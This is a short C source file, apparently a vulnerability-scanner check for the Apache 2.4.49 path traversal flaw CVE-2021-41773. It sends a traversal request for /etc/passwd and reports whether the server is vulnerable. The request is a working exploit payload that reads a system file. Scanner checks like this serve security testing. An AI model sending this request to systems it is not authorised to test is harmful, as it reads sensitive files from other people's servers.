/* http-vuln-cve2021-41773-4 - Apache 2.4.49 path traversal probe. */
#include "arsenal_util.h"

int almap_script_run(AlScriptContext *ctx) {
    char resp[8192];
    int n;

    if (!ar_valid(ctx)) {
        return 1;
    }
    n = ar_http_request(ctx, "GET", "/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd", NULL, NULL, NULL, NULL,
                        resp, sizeof(resp));
    if (n <= 0) {
        ar_out(ctx, "http-vuln-cve2021-41773-4: no HTTP response");
        return 0;
    }
    if (ar_contains_ci(resp, "root:")) {
        ar_out(ctx, "VULNERABLE: /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd [%d] (CVE-2021-41773)", ar_http_status(resp));
    } else {
        ar_out(ctx, "not vulnerable: CVE-2021-41773 (/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd [%d])", ar_http_status(resp));
    }
    return 0;
}
